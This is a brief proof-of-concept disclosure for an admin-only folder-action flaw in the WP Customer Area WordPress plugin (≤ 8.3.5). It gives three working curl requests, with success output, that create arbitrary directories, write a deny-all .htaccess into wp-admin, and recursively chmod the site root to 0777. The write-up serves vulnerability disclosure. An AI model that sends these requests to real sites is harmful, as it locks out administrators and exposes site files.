# WP Customer Area ≤ 8.3.5 — Path Traversal in ajax_folder_action

**Prerequisites**: Admin session + valid nonce from settings page.

To be honest, this cannot be considered a path traversal vulnerability because the feature is designed to allow the target folder to be any path, meaning there is no path that requires "traversal" to reach. However, I do believe that once an administrator has selected a target folder, a base_dir validation should be performed at that point, rather than continuing to accept relative paths like `../`. Additionally, recursive chmod is quite an abstract operation, so I decided to document it.

### 1. Create directory outside the plugin scope

```bash
curl -X POST "http://localhost/wordpress/wp-admin/admin-ajax.php" \
  -b "wordpress_logged_in_xxx=..." \
  -d "action=cuar_folder_action&folder_action=mkdir&path=C:\pwned&extra=0777&_ajax_nonce=XXXXXXXX"
```
→ `{"success":true}`

### 2. Write .htaccess to wp-admin

```bash
curl -X POST "http://localhost/wordpress/wp-admin/admin-ajax.php" \
  -b "..." \
  -d "action=cuar_folder_action&folder_action=secure-htaccess&path=D:\wamp\www\wordpress\wp-admin&extra=&_ajax_nonce=XXXXXXXX"
```
→ `{"success":true}`
→ wp-admin returns HTTP 500 (locked out by `Deny from all`)

### 3. Change permissions on WordPress root

```bash
curl -X POST "http://localhost/wordpress/wp-admin/admin-ajax.php" \
  -b "..." \
  -d "action=cuar_folder_action&folder_action=chmod&path=D:\wamp\www\wordpress&extra=0777&_ajax_nonce=XXXXXXXX"
```
→ `{"success":true}`

